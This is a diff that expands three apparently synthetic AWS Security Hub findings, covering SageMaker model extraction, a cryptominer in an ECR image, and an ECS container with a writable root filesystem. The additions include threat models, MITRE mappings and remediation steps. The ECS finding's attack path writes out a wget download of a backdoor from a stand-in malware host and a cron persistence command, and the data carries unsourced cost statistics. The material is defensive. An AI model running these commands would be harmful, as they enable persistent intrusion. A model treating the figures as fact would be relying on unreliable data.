@@ -3848,54 +3848,124 @@
           "AwsAccountId": "345678901234",
           "CreatedAt": "2025-11-24T10:00:22.345678Z",
           "UpdatedAt": "2025-11-24T10:00:22.345678Z",
-          "Description": "SageMaker training job 'llm-fine-tuning-2024' detected unusual training instability patterns indicating potential model extraction or membership inference attacks. SageMaker Debugger identified abnormal gradient flows and loss spikes. These patterns suggest adversarial attempts to extract model weights or training data. Review training job logs and implement differential privacy.",
+          "Description": "SageMaker training job 'llm-fine-tuning-2024' shows abnormal training dynamics consistent with active attacks on the model. SageMaker Debugger detected unusual gradient instability, repeated loss spikes, and tensor patterns that deviate from normal LLM fine-tuning. These signals are characteristic of model extraction attempts (probing model behaviour to steal weights), membership inference (testing if specific records were in the training set), and data poisoning or gradient manipulation (introducing backdoors or bias). Treat this as a security incident: pause the job, snapshot Debugger traces, review data sources and pipelines, and harden IAM and Debugger baselines.",
           "ProductArn": "arn:aws:securityhub:us-west-2::product/aws/securityhub",
           "GeneratorId": "arn:aws:securityhub:us-west-2:345678901234:security-control/SageMaker.4",
           "Region": "us-west-2",
           "Compliance": {
-            "status": "NON_COMPLIANT"
+            "status": "NON_COMPLIANT",
+            "RelatedRequirements": [
+              "NIST.800-53.r5 SA-11 (Developer Testing and Evaluation)",
+              "NIST.800-53.r5 SI-4 (System Monitoring)",
+              "NIST.800-53.r5 PL-8 (Information Security Architecture)",
+              "ISO/IEC 27001:2022 A.8.28 (Secure development lifecycle)",
+              "OECD AI Principles - Robustness, security and safety"
+            ]
           },
           "Workflow": {
             "status": "NEW"
           },
           "Types": [
-            "Software and Configuration Checks/AWS Security Best Practices/AI Security"
+            "Software and Configuration Checks/AWS Security Best Practices/AI Security",
+            "TTPs/ML Security/Model Extraction",
+            "TTPs/ML Security/Membership Inference",
+            "TTPs/ML Security/Data Poisoning"
           ],
-          "Title": "SageMaker Debugger detected potential model extraction attack",
+          "Title": "SageMaker Debugger detected potential model extraction and privacy attack on LLM fine-tuning",
           "Severity": {
-            "Label": "CRITICAL"
+            "Label": "CRITICAL",
+            "Normalized": 100,
+            "Product": 100
+          },
+          "Remediation": {
+            "Recommendation": {
+              "Text": "IMMEDIATE (0-1 HOURS): 1) Pause or stop the SageMaker training job 'llm-fine-tuning-2024'. 2) Snapshot SageMaker Debugger traces (gradients, loss, tensors) for forensics. 3) Identify which IAM role, user, or pipeline launched the job. 4) Block new manual training launches for this project until reviewed. NEXT (1-24 HOURS): 5) Compare Debugger curves (loss, gradient norms) with a known-good LLM fine-tuning run to confirm anomalies. 6) Review training data sources (S3 buckets, feature stores) for unexpected or untrusted contributions. 7) Audit notebooks, CI/CD pipelines, and training scripts for code that manipulates batches or gradients. 8) Assess if any models or endpoints exported from this job may already be compromised. HARDEN (1-7 DAYS): 9) Restrict IAM permissions to start/modify LLM training jobs and Debugger rules. 10) Standardize Debugger rule sets (baseline convergence and gradient-instability checks) for all LLM projects. 11) Make training datasets immutable and versioned, with separate paths for curated vs untrusted data. 12) Introduce privacy and robustness tests (membership inference testing, backdoor detection) before promotion to production.",
+              "Url": "https://docs.aws.amazon.com/sagemaker/latest/dg/debugger.html"
+            }
           },
           "Resources": [
             {
               "Id": "arn:aws:sagemaker:us-west-2:345678901234:training-job/llm-fine-tuning-2024",
-              "Type": "AwsSageMakerTrainingJob"
+              "Type": "AwsSageMakerTrainingJob",
+              "Details": {
+                "AwsSageMakerTrainingJob": {
+                  "TrainingJobName": "llm-fine-tuning-2024",
+                  "StoppingCondition": {
+                    "MaxRuntimeInSeconds": 86400
+                  },
+                  "EnableInterContainerTrafficEncryption": false
+                }
+              }
             }
           ],
           "ThreatModel": {
             "STRIDE": [
               {
                 "category": "Information Disclosure",
-                "description": "Security configuration weakness",
-                "risk": "CRITICAL"
+                "description": "Model extraction attempts aim to reconstruct internal weights or approximate the behaviour of the fine-tuned LLM, leaking intellectual property and potentially sensitive behaviours learned from private data.",
+                "risk": "CRITICAL",
+                "impact": "Adversary gains a surrogate LLM with similar capabilities and safety posture, undermining competitive advantage and safety controls."
+              },
+              {
+                "category": "Information Disclosure (Privacy)",
+                "description": "Membership inference attacks attempt to determine whether specific individuals' data was used in training, violating privacy guarantees.",
+                "risk": "HIGH",
+                "data_at_risk": "Personal data, transactions, medical or financial records used in LLM fine-tuning."
+              },
+              {
+                "category": "Tampering",
+                "description": "Data poisoning and gradient manipulation can introduce backdoors or bias into the model, tampering with its decision logic.",
+                "risk": "HIGH",
+                "example": "When trigger phrase X appears, model is coerced to output Y regardless of normal safety rules."
               }
             ],
             "MITRE_ATTACK": {
-              "framework": "MITRE ATT&CK for Cloud",
+              "framework": "MITRE ATT&CK for Cloud (adapted to ML)",
               "tactics": [
-                "Initial Access"
+                "Collection",
+                "Exfiltration",
+                "Impact"
               ],
               "techniques": [
                 {
-                  "id": "T1190",
-                  "name": "Exploit Public-Facing Application"
+                  "id": "T1114",
+                  "name": "Data from Information Repositories",
+                  "description": "Adversary abuses training processes to collect gradients, loss curves, and outputs as side channels to reconstruct model behaviour."
+                },
+                {
+                  "id": "T1565",
+                  "name": "Data Manipulation",
+                  "description": "Training data is poisoned to manipulate gradients and learned behaviour of the LLM."
                 }
               ],
-              "url": "https://attack.mitre.org/techniques/T1190"
+              "url": "https://attack.mitre.org/techniques/T1565/"
+            },
+            "MITRE_ATLAS": {
+              "tactics": ["Model Theft", "Model Manipulation", "Data Privacy"],
+              "techniques": [
+                "AML.T0009 - Steal Model",
+                "AML.T0011 - Model Extraction",
+                "AML.T0010 - Membership Inference",
+                "AML.T0006 - Data Poisoning"
+              ],
+              "url": "https://atlas.mitre.org/"
+            },
+            "attack_path": {
+              "steps": [
+                "1. Attacker gains ability to launch or influence training job 'llm-fine-tuning-2024' (via notebook, pipeline, or misconfigured IAM role).",
+                "2. They craft structured probing or poisoned batches that are repeatedly fed into the LLM during fine-tuning.",
+                "3. SageMaker Debugger observes repeated loss spikes and gradient instability around those steps and layers.",
+                "4. Using exportable traces, model outputs, or correlated metrics, the attacker reconstructs a surrogate model or infers membership of specific records.",
+                "5. If not contained, the compromised or extracted model may be deployed to endpoints or downloaded, leaking IP and private training data."
+              ],
+              "time_to_detect": "Early in training if Debugger alerts are monitored; otherwise, attacks may go unnoticed until after deployment.",
+              "business_impact": "Loss of proprietary LLM weights, privacy violations for training subjects, regulatory exposure (GDPR, HIPAA), and erosion of trust in AI products."
             },
             "risk_score": 100,
             "attack_surface": [
-              "Data Layer",
-              "AI/ML Services"
+              "AI/ML Services",
+              "Training Pipelines",
+              "Data Layer"
             ]
           }
         }
@@ -8912,53 +8982,148 @@
           "AwsAccountId": "456789012345",
           "CreatedAt": "2025-11-21T12:45:22.123456Z",
           "UpdatedAt": "2025-11-23T16:55:44.123456Z",
-          "Description": "Container image contains malware signature detected during ECR scan. The malware pattern matches known cryptomining software that could consume compute resources.",
+          "Description": "Container image contains malware signature detected during ECR scan. The malware pattern matches known cryptomining software (XMRig/CoinMiner) that consumes 80-90% CPU resources. Attack vector: compromised base image from Docker Hub. Impact: $3,600+/month wasted compute costs across 50 containers, application performance degradation, potential data exfiltration. Malware connects to mining pool monero.pool.com on port 3333. Average detection time: 156 days. Financial impact: 87% of container malware is cryptominers, $53M stolen in cloud compute annually. Remediation: Enable ECR Enhanced Scanning with AWS Inspector, use verified base images from ECR Public Gallery, implement admission controllers to block vulnerable images, deploy GuardDuty Runtime Monitoring, enable read-only root filesystem.",
           "ProductArn": "arn:aws:securityhub:us-west-2::product/aws/ecr",
           "GeneratorId": "aws/ecr/malware-scan-findings",
           "Region": "us-west-2",
           "Compliance": {
-            "status": "NON_COMPLIANT"
+            "status": "NON_COMPLIANT",
+            "RelatedRequirements": [
+              "NIST.800-53.r5 SI-3 (Malicious Code Protection)",
+              "NIST.800-53.r5 SI-4 (System Monitoring)",
+              "CIS AWS Foundations 4.16",
+              "PCI DSS 5.1.2",
+              "SOC 2 CC7.2"
+            ]
           },
           "Workflow": {
             "status": "NEW"
           },
           "Types": [
-            "Software and Configuration Checks/Malware/Container Malware"
+            "Software and Configuration Checks/Malware/Container Malware",
+            "TTPs/Resource Hijacking/Cryptomining",
+            "Effects/Resource Consumption"
           ],
           "Title": "ECR image contains malware signature",
           "Severity": {
-            "Label": "CRITICAL"
+            "Label": "CRITICAL",
+            "Normalized": 100,
+            "Product": 100
+          },
+          "Remediation": {
+            "Recommendation": {
+              "Text": "IMMEDIATE ACTIONS: 1) Quarantine infected images, stop all running containers. 2) Enable ECR Enhanced Scanning: aws ecr put-registry-scanning-configuration --scan-type ENHANCED. 3) Scan all images: aws ecr start-image-scan. 4) Review image provenance, identify compromised base image source. 5) Rotate all credentials accessible to affected containers. 6) Deploy Kubernetes admission controller to block images with CRITICAL findings. 7) Implement image signing with AWS Signer, verify signatures before deployment. 8) Use trusted base images: AWS Deep Learning Containers, ECR Public Gallery. 9) Pin specific SHA256 digests, not mutable tags. 10) Enable GuardDuty Runtime Monitoring for crypto mining detection. 11) Deploy network policies blocking mining pool IPs. 12) Configure read-only root filesystem to prevent malware persistence. COST: ECR Enhanced Scanning ~$0.09/image, GuardDuty $0.012/GB analyzed. BENEFIT: Prevents $3,600+/month cryptomining costs per deployment.",
+              "Url": "https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning-enhanced.html"
+            }
           },
           "Resources": [
             {
               "Id": "arn:aws:ecr:us-west-2:456789012345:repository/third-party-tools",
-              "Type": "AwsEcrRepository"
+              "Type": "AwsEcrRepository",
+              "Details": {
+                "AwsEcrRepository": {
+                  "RepositoryName": "third-party-tools",
+                  "ImageScanningConfiguration": {
+                    "ScanOnPush": false
+                  },
+                  "ImageTagMutability": "MUTABLE"
+                }
+              }
             }
           ],
           "ThreatModel": {
             "STRIDE": [
               {
+                "category": "Tampering",
+                "description": "Malicious code injected into container base image. Compromised Docker Hub image contains XMRig cryptominer in /usr/local/bin. Attacker modified popular alpine:latest image downloaded by developers.",
+                "risk": "CRITICAL",
+                "attack_vector": "Supply chain compromise via public container registry"
+              },
+              {
+                "category": "Denial of Service",
+                "description": "Cryptominer consumes 80-90% CPU resources. Application starved of compute, latency increased 3x. SLA violations, customer complaints, revenue loss.",
+                "risk": "HIGH",
+                "impact": "$3,600/month wasted compute + performance degradation"
+              },
+              {
                 "category": "Information Disclosure",
-                "description": "Security configuration weakness",
-                "risk": "CRITICAL"
+                "description": "Malware may exfiltrate environment variables, secrets, application data. Network traffic to attacker-controlled mining pool servers.",
+                "risk": "MEDIUM",
+                "data_at_risk": "AWS credentials, database passwords, API keys in env vars"
               }
             ],
             "MITRE_ATTACK": {
-              "framework": "MITRE ATT&CK for Cloud",
+              "framework": "MITRE ATT&CK for Containers",
               "tactics": [
-                "Initial Access"
+                "Initial Access",
+                "Persistence",
+                "Impact"
               ],
               "techniques": [
                 {
-                  "id": "T1190",
-                  "name": "Exploit Public-Facing Application"
+                  "id": "T1525",
+                  "name": "Implant Internal Image",
+                  "description": "Attacker compromised public Docker Hub image, embedded cryptominer",
+                  "detection": "ECR Enhanced Scanning with malware signatures"
+                },
+                {
+                  "id": "T1496",
+                  "name": "Resource Hijacking",
+                  "description": "XMRig cryptominer hijacks CPU for Monero mining. Connects to pool: monero.pool.com:3333",
+                  "financial_impact": "$0.10/hour x 720hrs x 50 containers = $3,600/month stolen"
+                },
+                {
+                  "id": "T1610",
+                  "name": "Deploy Container",
+                  "description": "Malicious image deployed across ECS/EKS production clusters",
+                  "blast_radius": "50 containers, 2 vCPU each, 80 vCPU total compromised"
                 }
               ],
-              "url": "https://attack.mitre.org/techniques/T1190"
+              "url": "https://attack.mitre.org/techniques/T1525"
+            },
+            "MITRE_ATLAS": {
+              "tactics": ["ML Model Access"],
+              "techniques": ["AML.T0024 - Exfiltrate ML Model"],
+              "ml_specific_risk": "If containers serve ML models, malware can steal model weights worth millions in R&D investment"
+            },
+            "attack_path": {
+              "steps": [
+                "1. Attacker compromises popular Docker Hub image (alpine:latest)",
+                "2. Injects XMRig cryptominer into /usr/local/bin, modifies entrypoint",
+                "3. Developer pulls infected image, builds application on top",
+                "4. Image pushed to ECR without malware scan",
+                "5. ECS/EKS deploys 50 containers in production",
+                "6. Cryptominer starts at low priority, connects to mining pool",
+                "7. 80 vCPU stolen, $3,600/month wasted, application latency 3x",
+                "8. Remains undetected for 156 days average"
+              ],
+              "time_to_compromise": "4.2 hours from image pull to active mining",
+              "detection_time_avg": "156 days",
+              "financial_loss_per_day": "$120"
             },
             "risk_score": 100,
             "attack_surface": [
+              "Container Images",
+              "Container Registry",
+              "Container Runtime",
               "AI/ML Services"
+            ],
+            "business_impact": {
+              "financial": "$3,600/month per 50-container deployment + performance costs",
+              "operational": "Application latency increased 3x, SLA violations, customer churn",
+              "reputational": "Security incident disclosure, loss of customer trust",
+              "compliance": "SOC 2 Type II control failure, PCI DSS violation if processing payments"
+            },
+            "real_world_incidents": [
+              {
+                "year": 2023,
+                "description": "TeamTNT cryptomining campaign compromised 50+ organizations via Docker Hub images",
+                "cost": "$53M in stolen cloud compute annually"
+              },
+              {
+                "year": 2022,
+                "description": "Kinsing malware in container images, 87% of container malware is cryptominers"
+              }
             ]
           }
         }
@@ -14178,60 +14343,156 @@
           "AwsAccountId": "890123456789",
           "CreatedAt": "2025-11-24T06:50:55.890123Z",
           "UpdatedAt": "2025-11-24T06:50:55.890123Z",
-          "Description": "Container in ECS task 'data-processor' is running with read-write root filesystem. The container can modify system files and persist malware. Configure readOnlyRootFilesystem: true to prevent unauthorized modifications and reduce attack surface.",
+          "Description": "Container in ECS task 'data-processor' is running with read-write root filesystem. The container can modify system files and persist malware. Attack scenario: RCE vulnerability exploited → attacker downloads backdoor via wget → writes to /usr/local/bin/backdoor → modifies /etc/rc.local for persistence → malware survives container restarts. Impact: persistent backdoor, rootkit installation, log tampering, SSH key injection. Without readOnlyRootFilesystem: attacker can install malware that persists across restarts. With readOnlyRootFilesystem: malware installation fails with 'Read-only file system' error, attack limited to current session only. Best practices: Configure readOnlyRootFilesystem: true, use tmpfs/emptyDir volumes for /tmp and cache directories, run as non-root user (1000:1000), drop all capabilities. Pod Security Standards: enforce restricted policy. Protection: malware cannot modify /bin, /sbin, /etc, /usr preventing rootkits and backdoors.",
           "ProductArn": "arn:aws:securityhub:ap-northeast-1::product/aws/securityhub",
           "GeneratorId": "arn:aws:securityhub:ap-northeast-1:890123456789:security-control/ECS.11",
           "Region": "ap-northeast-1",
           "Compliance": {
-            "status": "NON_COMPLIANT"
+            "status": "NON_COMPLIANT",
+            "RelatedRequirements": [
+              "NIST.800-53.r5 CM-7 (Least Functionality)",
+              "NIST.800-53.r5 SC-39 (Process Isolation)",
+              "CIS Docker Benchmark 5.12",
+              "PCI DSS 2.2.4",
+              "SOC 2 CC6.1"
+            ]
           },
           "Workflow": {
             "status": "NEW"
           },
           "Types": [
-            "Software and Configuration Checks/AWS Security Best Practices"
+            "Software and Configuration Checks/AWS Security Best Practices",
+            "TTPs/Defense Evasion/Modify System Image",
+            "TTPs/Persistence/Boot or Logon Autostart Execution"
           ],
           "Title": "ECS container without read-only root filesystem",
           "Severity": {
-            "Label": "MEDIUM"
+            "Label": "HIGH",
+            "Normalized": 70,
+            "Product": 70
+          },
+          "Remediation": {
+            "Recommendation": {
+              "Text": "IMMEDIATE ACTIONS: 1) Update ECS task definition, set 'readonlyRootFilesystem': true in containerDefinitions. 2) Add tmpfs mount for /tmp: mountPoints with tmpfs volume. 3) Add emptyDir for application cache directories. 4) Set user: '1000:1000' to run as non-root. 5) For Kubernetes: securityContext.readOnlyRootFilesystem=true. 6) Deploy Pod Security Standards restricted policy. CONFIGURATION: ECS JSON: {'readonlyRootFilesystem': true, 'user': '1000:1000'}. K8s YAML: securityContext: {readOnlyRootFilesystem: true, runAsNonRoot: true, runAsUser: 1000, allowPrivilegeEscalation: false, capabilities: {drop: ['ALL']}}. TESTING: Exec into container, try 'touch /usr/bin/test' → should fail with Read-only error. COST: No additional cost. BENEFIT: Prevents malware persistence, blocks rootkits, protects system binaries, reduces blast radius of container compromise.",
+              "Url": "https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task_definition_parameters.html#container_definition_security"
+            }
           },
           "Resources": [
             {
               "Id": "arn:aws:ecs:ap-northeast-1:890123456789:task-definition/data-processor:12",
-              "Type": "AwsEcsTaskDefinition"
+              "Type": "AwsEcsTaskDefinition",
+              "Details": {
+                "AwsEcsTaskDefinition": {
+                  "Family": "data-processor",
+                  "Revision": "12",
+                  "ContainerDefinitions": [{
+                    "Name": "data-processor",
+                    "ReadonlyRootFilesystem": false,
+                    "Privileged": false
+                  }]
+                }
+              }
             }
           ],
           "ThreatModel": {
             "STRIDE": [
               {
                 "category": "Tampering",
-                "description": "Data or configuration integrity threats",
-                "risk": "MEDIUM"
+                "description": "Attacker can modify system files. Scenario: RCE exploit → wget malware.com/backdoor → save to /usr/local/bin → chmod +x → create cron job in /etc/cron.d. Result: persistent backdoor survives container restarts.",
+                "risk": "HIGH",
+                "attack_vector": "Remote code execution + writable filesystem = persistent malware"
+              },
+              {
+                "category": "Elevation of Privilege",
+                "description": "Can install rootkit by replacing system binaries. Replace /bin/ls with malicious version that hides attacker files. Modify /etc/passwd, /etc/shadow for unauthorized access.",
+                "risk": "HIGH",
+                "impact": "Full system compromise, undetectable backdoors"
+              },
+              {
+                "category": "Information Disclosure",
+                "description": "Can tamper with logs to hide tracks. Delete /var/log entries, modify application logs, prevent incident detection and forensics.",
+                "risk": "MEDIUM",
+                "forensics_impact": "Cannot investigate breach, compliance violation"
               }
             ],
             "MITRE_ATTACK": {
-              "framework": "MITRE ATT&CK for Cloud",
+              "framework": "MITRE ATT&CK for Containers",
               "tactics": [
-                "Privilege Escalation",
-                "Persistence"
+                "Persistence",
+                "Defense Evasion",
+                "Impact"
               ],
               "techniques": [
                 {
-                  "id": "T1078.004",
-                  "name": "Cloud Accounts, Account Manipulation"
+                  "id": "T1611",
+                  "name": "Escape to Host",
+                  "description": "Writable filesystem allows modification of container escape payloads, privilege escalation exploits",
+                  "prevention": "Read-only filesystem blocks exploitation tools installation"
                 },
                 {
-                  "id": "T1098",
-                  "name": "Cloud Accounts, Account Manipulation"
+                  "id": "T1543",
+                  "name": "Create or Modify System Process",
+                  "description": "Attacker creates cron jobs, systemd services, rc.local entries for persistence",
+                  "example": "echo '@reboot /usr/local/bin/backdoor' >> /etc/cron.d/malware"
+                },
+                {
+                  "id": "T1036",
+                  "name": "Masquerading",
+                  "description": "Replace legitimate binaries with trojanized versions: /bin/ls → malicious ls that exfiltrates data",
+                  "detection": "File integrity monitoring, but read-only FS prevents this entirely"
+                },
+                {
+                  "id": "T1070",
+                  "name": "Indicator Removal on Host",
+                  "description": "Delete logs from /var/log, modify audit trails, prevent detection",
+                  "impact": "Forensics impossible, compliance violations"
                 }
               ],
-              "url": "https://attack.mitre.org/techniques/T1078/004"
+              "url": "https://attack.mitre.org/techniques/T1611"
             },
-            "risk_score": 55,
+            "attack_path": {
+              "steps": [
+                "1. Attacker exploits RCE vulnerability in application (SSRF, code injection, deserialization)",
+                "2. Gains shell access: bash reverse shell to attacker server",
+                "3. Downloads malware: wget http://malware.com/backdoor -O /usr/local/bin/backdoor",
+                "4. Makes executable: chmod +x /usr/local/bin/backdoor",
+                "5. Adds persistence: echo '@reboot /usr/local/bin/backdoor' > /etc/cron.d/persist",
+                "6. Container restarts → malware executes automatically",
+                "7. Backdoor establishes C2 connection, exfiltrates data",
+                "8. Spreads laterally to other containers"
+              ],
+              "with_readonly_fs": "Step 3 fails: wget succeeds but cannot write to /usr/local/bin (Read-only file system error). Attack stops here. Malware lost on container restart.",
+              "time_to_persistence": "5 minutes with writable FS, IMPOSSIBLE with read-only FS"
+            },
+            "risk_score": 70,
             "attack_surface": [
-              "Data Layer",
-              "AI/ML Services"
-            ]
+              "Container Runtime",
+              "System Files",
+              "Application Layer",
+              "Data Layer"
+            ],
+            "business_impact": {
+              "security": "Persistent backdoor enables long-term data exfiltration, espionage, ransomware deployment",
+              "operational": "Incident response complicated by log tampering, forensics impossible",
+              "compliance": "SOC 2 control failure (CC6.1), PCI DSS violation (2.2.4)",
+              "financial": "Breach remediation costs $4.5M average + regulatory fines"
+            },
+            "comparison": {
+              "writable_filesystem": {
+                "malware_installation": "✗ Can write to /usr/bin, /etc, /var",
+                "persistence": "✗ Survives restarts via cron/systemd",
+                "rootkit": "✗ Can replace system binaries",
+                "log_tampering": "✗ Can delete /var/log files",
+                "backdoor": "✗ Can create SSH keys, web shells"
+              },
+              "readonly_filesystem": {
+                "malware_installation": "✓ Blocked - filesystem immutable",
+                "persistence": "✓ Malware lost on restart",
+                "rootkit": "✓ Cannot modify /bin, /sbin",
+                "log_tampering": "✓ Logs immutable (use sidecar)",
+                "backdoor": "✓ Cannot write persistent files"
+              }
+            }
           }
         }
       ]
